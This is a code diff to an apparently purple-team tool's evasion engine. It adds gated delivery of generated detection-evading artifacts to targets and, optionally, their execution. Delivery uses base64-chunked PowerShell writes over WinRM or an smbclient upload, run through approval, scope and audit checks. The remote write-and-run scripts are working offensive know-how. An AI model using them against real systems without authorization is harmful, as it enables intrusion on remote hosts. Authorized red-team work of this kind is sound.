@@ -1,12 +1,30 @@
-"""Bespoke evasion engine (build #4, item C) — GENERATES ONLY, never runs or deploys.
+"""Bespoke evasion engine (build #4, item C; delivery added build #13 part 2).
+
+GENERATE-ONLY WAS REMOVED ON PURPOSE. Until build #13 this engine carried no delivery or
+execution primitive at all and two tests enforced it. That property is gone by decision,
+following the precedent set when the Sliver server and the pivot/DNS listeners went from
+refused-outright to gated-and-allowed: the GATE, not the absence of the feature, is the
+control. The artifact always landed in a loot directory mounted into the sandbox and sitting on
+the host, so an operator could already copy it out and run it by hand; what changed is that the
+step no longer has to leave the tool.
+
+What replaces it, and is asserted just as hard by test_evasion_safety:
+  * :func:`deliver`'s ``kind`` is a CLOSED SET (winrm | smb) and no request field is a command.
+    A free-form delivery string would be a general execution path with none of the gates.
+  * The artifact is a program ONLY on the gated WinRM invoke path. There is deliberately no
+    sandbox invoke — detonating the payload inside HackPit's own box is never what the operator
+    wants — so it is REFUSED, not merely unimplemented.
+  * The WinRM send goes THROUGH ``executor.send_windows_scripts``, never around it. This module
+    does not touch ``winrm_transport``: only the executor and the router may, and the right
+    answer to that rule is to use the gated execution point, not to be added to its allow-list.
 
 CONTAINMENT (mirrors cockpit/repeater.py and cockpit/sliver.py):
 
 * :func:`generate` runs the generators (donut / ScareCrow) as argv-only ``docker exec`` inside
   a container resolved from the execution MODE. The container is a code constant, never a
   request field, and no shell parses any request value.
-* It GENERATES an artifact into the loot directory. It NEVER runs or deploys the artifact —
-  the produced path is never argv[0] of anything, and there is no deploy function here.
+* :func:`generate` still NEVER runs the artifact — the produced path is never argv[0] of
+  anything there, and that assertion is unchanged.
 * HUMAN-invoked through the main.py endpoint only. The orchestrator / agent / loop modules
   have ZERO code path here (AST-asserted by test_evasion_safety.py).
 * GATED: every generate builds an ExecRequest and runs the SAME gates a one-shot command run
@@ -27,6 +45,7 @@ evasion how-to; this is the thing that keeps it a purple-team tool.
 """
 from __future__ import annotations
 
+import base64
 import subprocess
 import uuid
 from datetime import datetime, timezone
@@ -36,7 +55,7 @@ from typing import Any
 from pydantic import BaseModel, Field, field_validator
 
 from cockpit import config, executor, loot, runstore
-from cockpit.models import ExecRequest, RunRecord
+from cockpit.models import ExecRejected, ExecRequest, RunRecord
 from detection import resolver as det
 
 _TEMPLATES = Path(__file__).resolve().parent / "templates"
@@ -352,4 +371,313 @@ def generate(req: EvasionRequest) -> EvasionResult:
         footprint=footprint,
         opsec_note=opsec,
         stub=stub,
+    )
+
+
+# --------------------------------------------------------------------------- #
+# DELIVERY (build #13 part 2) — the deliberate reversal of "generate only".
+#
+# This package used to carry no delivery or execution primitive at all, and two tests enforced
+# it. That property is removed ON PURPOSE, following the precedent set when the Sliver server
+# and the pivot/DNS listeners went from refused-outright to gated-and-allowed: the GATE, not
+# the absence of the feature, is the control. The artifact already lands in a loot directory
+# mounted into the sandbox and sitting on the host, so an operator could always copy it out and
+# run it by hand; what changes is that the step no longer has to leave the tool.
+#
+# WHAT DOES NOT CHANGE: the mandatory footprint. `deliver` computes the honest half FIRST and
+# raises rather than act without it, exactly as `generate` does. An evasion tool that told you
+# only how to be quieter, and never what still sees you, would be an evasion how-to.
+#
+# TWO PRIMITIVES, DELIBERATELY SEPARATED. Putting an artifact somewhere and RUNNING it are
+# different acts with different blast radii; a single `deploy()` would leave the gate unable to
+# tell them apart. There is deliberately NO sandbox invoke — detonating the payload inside our
+# own box is never what the operator wants, so it is REFUSED, not merely unimplemented.
+# --------------------------------------------------------------------------- #
+
+# A CLOSED SET. `kind` is never a free-form command: a `deliver(command=...)` taking an
+# arbitrary delivery string would hand this package a general execution path with none of the
+# executor's gates — the exact shape the whole-tree scans exist to catch.
+DELIVERY_KINDS: tuple[str, ...] = ("winrm", "smb")
+
+# Raw bytes per chunk. Base64 expands 4/3, so ~3 KiB in is ~4 KiB of command text — well under
+# WinRM's per-command ceiling even with the PowerShell wrapper around it. Chunking is NOT
+# optional: a truncated payload that reported success would be worse than a failed transfer.
+WINRM_CHUNK_BYTES = 3072
+
+
+class DeliveryRequest(BaseModel):
+    """Put a previously-generated artifact on a target, or run it there."""
+
+    kind: str = Field(..., description="winrm | smb — a closed set, never a command.")
+    artifact_path: str = Field(..., description="Host path of an artifact a build produced.")
+    techniques: list[str] = Field(..., description="The build's technique — carries the footprint.")
+    dest: str = Field(..., description="Remote path (winrm) or //host/share (smb).")
+    windows_profile_id: str | None = None
+    engagement_id: str | None = None
+    smb_credential: str = Field("", description="user%pass for smbclient. Never recorded.")
+    session_id: str | None = None
+    step_id: str | None = None
+    approved: bool = False
+    dangerous_ack: bool = False
+    invoke: bool = Field(False, description="After delivery, RUN it. WinRM only.")
+
+    @field_validator("kind")
+    @classmethod
+    def _known_kind(cls, v: str) -> str:
+        if v not in DELIVERY_KINDS:
+            raise ValueError(f"unknown delivery kind {v!r} — known: {', '.join(DELIVERY_KINDS)}")
+        return v
+
+    @field_validator("dest", "artifact_path")
+    @classmethod
+    def _no_flag_lookalike_path(cls, v: str) -> str:
+        if v.startswith("-"):
+            raise ValueError("a path must not start with '-' — it would be read as an option")
+        return v
+
+    @field_validator("techniques")
+    @classmethod
+    def _one_known_technique(cls, v: list[str]) -> list[str]:
+        if len(v) != 1 or v[0] not in TECHNIQUES:
+            raise ValueError("exactly one known technique — a delivery carries ONE footprint")
+        return v
+
+
+class DeliveryResult(BaseModel):
+    """What was delivered, and MANDATORILY what a defender sees when it lands."""
+
+    run_id: str
+    kind: str
+    dest: str
+    mode: str
+    chunks: int = 0
+    exit_code: int | None = None
+    stdout: str = ""
+    stderr: str = ""
+    footprint: dict[str, Any]
+    opsec_note: dict[str, Any]
+    invoked: bool = False
+
+
+def _delivery_gate_request(req: DeliveryRequest) -> ExecRequest:
+    """The ExecRequest the REAL executor gates. Mode follows the delivery kind.
+
+    winrm -> windows mode, target-locked to the profile host.
+    smb   -> engagement mode, target-locked to the engagement's program scope, so an
+             out-of-scope share is refused at the target gate like any other command.
+    """
+    if req.kind == "winrm":
+        return ExecRequest(
+            command="evasion-deliver", args=[req.dest],
+            windows_profile_id=req.windows_profile_id,
+            approved=req.approved, dangerous_ack=req.dangerous_ack,
+            session_id=req.session_id, step_id=req.step_id,
+        )
+    return ExecRequest(
+        command="smbclient", args=[req.dest],
+        engagement_id=req.engagement_id,
+        approved=req.approved, dangerous_ack=req.dangerous_ack,
+        session_id=req.session_id, step_id=req.step_id,
+    )
+
+
+def validate_delivery(req: DeliveryRequest):
+    """The gate verdict for a delivery, without delivering anything. PURE.
+
+    The red-confirm is required UNCONDITIONALLY rather than left to the heuristic to notice.
+    Delivering or running an artifact built to evade detection is categorically dangerous, and
+    build #5's finding was that a gate depending on a classifier spotting a name is a gate a
+    rename defeats. So this asks for `dangerous_ack` itself, on top of whatever the heuristic
+    decides about the argv.
+    """
+    if not req.dangerous_ack:
+        return ExecRejected(
+            reason="delivering or running an evasion artifact always needs the red-confirm "
+                   "(dangerous_ack=true) — this does not depend on the heuristic noticing",
+            gate="danger",
+        )
+    if req.invoke and req.kind != "winrm":
+        # Refused on the `windows` gate rather than a new one: the honest statement is that
+        # invoke REQUIRES the WinRM path, and ExecRejected.gate is a closed Literal shared by
+        # every caller. Widening a shared type for one module's convenience would be the wrong
+        # trade — the message carries the specificity, the gate stays the executor's vocabulary.
+        return ExecRejected(
+            reason="there is no sandbox invoke — running the artifact inside HackPit's own "
+                   "sandbox detonates it on the operator's box, never the target; invoke is "
+                   "only available over WinRM against a Windows profile host",
+            gate="windows",
+        )
+    return executor.validate_request(_delivery_gate_request(req))
+
+
+def _b64_chunks(data: bytes, size: int = WINRM_CHUNK_BYTES) -> list[str]:
+    """Base64 chunks of the artifact. PURE — no I/O, no execution."""
+    return [
+        base64.b64encode(data[i:i + size]).decode("ascii")
+        for i in range(0, len(data), size)
+    ]
+
+
+def winrm_write_script(dest: str, chunk: str, *, first: bool) -> str:
+    """The PowerShell for ONE chunk. PURE — builds a string, runs nothing.
+
+    The first chunk truncates and the rest append, so a re-run never concatenates onto a stale
+    file. Bytes go through a FileStream rather than Set-Content: Set-Content on a string would
+    apply an encoding and newline translation, which corrupts a PE.
+    """
+    mode = "Create" if first else "Append"
+    return (
+        "$b=[Convert]::FromBase64String('" + chunk + "');"
+        "$s=[IO.File]::Open('" + dest + "',[IO.FileMode]::" + mode + ","
+        "[IO.FileAccess]::Write);$s.Write($b,0,$b.Length);$s.Close()"
+    )
+
+
+def winrm_verify_script(dest: str) -> str:
+    """PowerShell reporting the delivered file's size. PURE.
+
+    A chunked transfer is only complete when the far side agrees on the length. Reporting
+    success on a short write is the failure mode chunking introduces, so it is CHECKED.
+    """
+    return "(Get-Item -LiteralPath '" + dest + "').Length"
+
+
+def winrm_invoke_script(dest: str) -> str:
+    """PowerShell that RUNS the delivered artifact. PURE — builds a string.
+
+    This is the one place the artifact is a program rather than an output value, and it exists
+    only on the gated WinRM path.
+    """
+    return "& '" + dest + "'"
+
+
+def smb_argv(req: DeliveryRequest, artifact: str) -> list[str]:
+    """The smbclient argv. PURE, and a LIST — no shell, so no request value is ever parsed.
+
+    The credential is passed as `-U user%pass`; the audited record is built from a MASKED copy
+    (see `deliver`), so the run store never becomes a key store. Same rule obfuscation.py
+    applies to its pre-shared tunnel key.
+    """
+    argv = ["smbclient", req.dest]
+    if req.smb_credential:
+        argv += ["-U", req.smb_credential]
+    return argv + ["-c", "put " + artifact]
+
+
+def _masked_argv(argv: list[str]) -> list[str]:
+    """argv with any `-U user%pass` value replaced. Masked BY CONSTRUCTION, at the source."""
+    out = list(argv)
+    for i, tok in enumerate(out):
+        if tok == "-U" and i + 1 < len(out):
+            out[i + 1] = "***"
+    return out
+
+
+def deliver(req: DeliveryRequest, *, _winrm=None, _run=None) -> DeliveryResult:
+    """Put the artifact on the target, and optionally RUN it. Gated, scope-checked, audited.
+
+    Order matters and mirrors `generate`: the honest half is computed FIRST, so an artifact the
+    engine cannot describe is never delivered — not even to a scoped, approved, red-confirmed
+    target. The footprint is not suppressible and there is no flag to skip it.
+
+    ``_winrm`` / ``_run`` are injection points for the hermetic tests, the way test_winrm
+    monkeypatches the transport. Production passes neither.
+    """
+    footprint, opsec = _honest_footprint(req.techniques)
+
+    rejected = validate_delivery(req)
+    if rejected is not None:
+        raise EvasionRefused(rejected.reason, gate=getattr(rejected, "gate", ""))
+
+    try:
+        resolved = executor.resolve_mode(_delivery_gate_request(req))
+    except executor.EngagementInactive as exc:
+        raise EvasionRefused(str(exc), gate="engagement") from exc
+    except executor.WindowsProfileUnavailable as exc:
+        raise EvasionRefused(str(exc), gate="windows") from exc
+
+    run_id = uuid.uuid4().hex[:12]
+    started = _now()
+    chunks_sent = 0
+    exit_code: int | None = 0
+    stdout = stderr = ""
+    invoked = False
+    audit_argv: list[str] = []
+
+    if req.kind == "winrm":
+        data = Path(req.artifact_path).read_bytes()
+        chunks = _b64_chunks(data)
+        # Build the WHOLE sequence, then hand it to the executor as ONE gated act. This module
+        # deliberately does NOT touch winrm_transport: `test_winrm_safety` allows only the
+        # executor and the router to reach it, and the right answer to that is to go THROUGH
+        # the gated execution point rather than around it. See executor.send_windows_scripts.
+        scripts = [winrm_write_script(req.dest, c, first=i == 0) for i, c in enumerate(chunks)]
+        scripts.append(winrm_verify_script(req.dest))
+        if req.invoke:
+            scripts.append(winrm_invoke_script(req.dest))
+
+        send = _winrm or executor.send_windows_scripts
+        try:
+            results = send(_delivery_gate_request(req), scripts)
+        except executor.WindowsDeliveryRefused as exc:
+            raise EvasionRefused(exc.reason, gate=exc.gate) from exc
+
+        chunks_sent = sum(1 for r in results[:len(chunks)] if r.get("status_code", 1) == 0)
+        failed = next((r for r in results if r.get("status_code", 1) != 0), None)
+        if failed is not None:
+            exit_code, stderr = failed.get("status_code", 1), failed.get("stderr", "")
+        elif len(results) > len(chunks):
+            # VERIFY. A chunked transfer is only complete when the far side agrees on the
+            # length — reporting success on a short write is the failure mode chunking
+            # introduces, so it is CHECKED rather than assumed.
+            landed = (results[len(chunks)].get("stdout") or "").strip()
+            if landed.isdigit() and int(landed) != len(data):
+                exit_code = 1
+                stderr = (f"short write: {landed} bytes landed of {len(data)} — the artifact on "
+                          "the target is TRUNCATED, do not run it")
+            else:
+                stdout = f"{len(data)} bytes in {chunks_sent} chunk(s)"
+                if req.invoke and len(results) > len(chunks) + 1:
+                    ran = results[len(chunks) + 1]
+                    invoked = True
+                    exit_code = ran.get("status_code", 0)
+                    stdout += "\n" + (ran.get("stdout") or "")
+                    stderr = ran.get("stderr", "")
+        audit_argv = ["winrm", req.dest, f"{chunks_sent} chunk(s)"]
+    else:
+        argv = ["docker", "exec", resolved.container, *smb_argv(req, req.artifact_path)]
+        runner = _run or subprocess.run
+        try:
+            proc = runner(argv, capture_output=True, text=True, timeout=300)
+            exit_code, stdout, stderr = proc.returncode, proc.stdout, proc.stderr
+            chunks_sent = 1
+        except subprocess.TimeoutExpired:
+            exit_code, stderr = None, "the delivery timed out"
+        except OSError as exc:
+            exit_code, stderr = None, f"could not start smbclient: {exc}"
+        audit_argv = _masked_argv(argv)
+
+    runstore.save_run(
+        RunRecord(
+            run_id=run_id,
+            command="evasion-deliver",
+            args=audit_argv,
+            target=req.dest,
+            approved=True,
+            mode=resolved.mode,
+            exit_code=exit_code,
+            stdout=stdout[:_MAX_OUTPUT],
+            stderr=stderr[:_MAX_OUTPUT],
+            started_at=started,
+            finished_at=_now(),
+            session_id=req.session_id,
+            step_id=req.step_id,
+        )
+    )
+
+    return DeliveryResult(
+        run_id=run_id, kind=req.kind, dest=req.dest, mode=resolved.mode,
+        chunks=chunks_sent, exit_code=exit_code,
+        stdout=stdout[:_MAX_OUTPUT], stderr=stderr[:_MAX_OUTPUT],
+        footprint=footprint, opsec_note=opsec, invoked=invoked,
     )
